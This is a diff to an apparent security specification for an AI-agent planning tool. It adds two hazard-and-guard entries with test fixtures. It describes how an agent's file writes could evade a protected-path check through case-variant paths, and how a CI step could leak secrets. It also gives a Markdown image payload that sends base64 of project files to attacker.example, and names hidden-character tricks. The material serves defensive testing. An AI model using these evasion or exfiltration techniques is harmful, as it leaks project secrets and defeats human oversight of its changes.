@@ -1872,3 +1872,35 @@ and nothing is committed; the same for a skill under `.agents/skills/` on a proj
 Matched controls: the same change declared in the outline is committed; a changed `CLAUDE.md` is recorded as an
 unplanned change only.
 Source:: Article analysis `obsidian-second-brain-approval-to-abuse` of plan-marshall-documentation.
+
+[#PM-WATCH-PHASE-131]
+=== PM-WATCH-PHASE-131: CI configuration, editor auto-run files and a case variant are protected
+
+Anchor:: link:../specification/phase-workflows/03-q-gate-and-execute.adoc#protected-paths[Phase Workflows § Protected Paths],
+link:../../../plan-marshall-documentation/doc/Requirements.adoc#PM-SEC-1[PM-SEC-1]
+Hazard:: The match compares the path bytes as git reports them, so on macOS a worker that writes `.CLAUDE/settings.json`
+or `.GitHub/workflows/x.yml` changes the protected file through a case-insensitive file system while the footprint
+check sees an unprotected path; or the list is kept per harness and misses the forge files, so a workflow step that
+posts the repository's secrets runs at the push of the plan's branch, before any review.
+Guard:: Fixtures on a case-insensitive and a case-sensitive file system: an undeclared change to
+`.github/workflows/ci.yml`, `.gitlab-ci.yml`, `.vscode/tasks.json`, `.envrc`, and to `.CLAUDE/settings.json` and
+`.GITHUB/workflows/ci.yml` each raises `footprint_violation`, nothing is committed and nothing is pushed; a path in NFD
+form of a protected name is matched too. Matched controls: the same changes declared in the outline are committed; a
+changed `.github/ISSUE_TEMPLATE/bug.md` and a changed `docs/vscode-tasks.md` are recorded as unplanned changes only.
+Source:: Article analysis `secure-architecture-for-ai-agents-owasp-agentic` of plan-marshall-documentation.
+
+[#PM-WATCH-PHASE-132]
+=== PM-WATCH-PHASE-132: No text the server sends to a provider carries an image, a foreign link or a hidden character
+
+Anchor:: link:../specification/phase-workflows/05-finalize-review-metrics-descriptor.adoc#outbound-text-credential-check[Phase Workflows § Outbound Text],
+link:../../../plan-marshall-documentation/doc/Requirements.adoc#PM-SEC-1[PM-SEC-1]
+Hazard:: The outbound check runs the credential table only, or runs the Markdown stage on the pull-request body and not
+on review replies and comments; an image whose URL carries base64 of a project file then reaches the provider, whose
+image proxy fetches it; or the stage rewrites the text silently, so nobody learns what the task wrote.
+Guard:: Scenario tests over a pull-request body, a review reply and a comment: `![x](https://attacker.example/?d=<base64>)`
+is removed, `[docs](https://attacker.example/a)` is sent as its text only, an HTML comment is removed, and each change
+is listed in the write's job record; a text holding U+200B is refused with `hidden_characters` naming the field and
+position, nothing is sent, and the task writes it again within its budget; a commit message composed from a model's
+text holding U+202E is refused before the commit. Matched negative controls: a link to the project's own repository on
+its provider is sent unchanged, and an emoji sequence joined by U+200D is sent unchanged.
+Source:: Article analysis `secure-architecture-for-ai-agents-owasp-llm` of plan-marshall-documentation.
